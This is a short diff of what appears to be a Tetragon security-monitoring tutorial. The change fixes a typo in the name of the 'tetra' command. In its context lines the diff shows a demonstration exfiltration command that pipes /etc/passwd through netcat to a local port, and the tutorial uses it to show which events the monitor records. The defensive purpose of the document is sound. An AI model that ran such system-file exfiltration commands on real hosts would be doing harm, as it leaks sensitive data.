@@ -183,7 +183,7 @@ Stop Tetragon, load the program, restart Tetragon and run the same exfiltration 
 > cat /etc/passwd | nc 127.0.0.1 8080
 ```
 
-In the `tetraà window, we only process `exit` events! No execution events are present.
+In the `tetra` window, we only process `exit` events! No execution events are present.
 
 ```
 > sudo tetra getevents --output compact
